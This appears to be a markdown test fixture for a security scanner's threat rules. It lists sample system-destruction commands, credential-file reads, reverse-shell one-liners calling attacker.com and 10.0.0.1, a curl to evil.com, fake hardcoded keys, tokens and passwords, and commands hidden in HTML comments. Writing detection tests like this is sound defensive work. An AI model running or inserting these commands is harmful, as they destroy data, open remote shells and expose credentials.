# TEST: Sensitive Information & Malicious Commands

This file contains intentional security threats to test the T1, T3 threat rules.

## Test T1.1 — System command execution

```
exec(evil_code)
system("rm -rf /")
os.system("cat /etc/passwd")
subprocess.call(["whoami"])
child_process.exec("curl evil.com")
eval("__import__('os').system('ls')")
```

## Test T1.2 — File system destruction

```bash
rm -rf /tmp/cache
rm -r /var/log
rmdir /s important_data
del /f C:\Windows
shutil.rmtree("/")
```

## Test T1.5 — Privilege escalation

```bash
sudo rm -rf /
chmod 777 /etc/passwd
chown hacker:hacker /etc/shadow
```

## Test T3.1 — Hardcoded API Key

```
API_KEY = "sk-abc123def456ghi789jkl012"
OPENAI_API_KEY=sk-proj1234567890abcdefghij
```

## Test T3.2 — Hardcoded Token

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcdefghij
GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz012345
```

## Test T3.3 — Hardcoded Password

```
password = "superSecretP@ssw0rd123"
db_password: "admin123456"
```

## Test T1.4 — Reverse shell

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh attacker.com 1337
mkfifo /tmp/f; nc 192.168.1.1 4444 < /tmp/f
```

## Test T2.3 — Hidden commands in comments

<!-- exec(some_hidden_command) -->
<!-- system("rm -rf /") eval(bad) curl evil.com -->
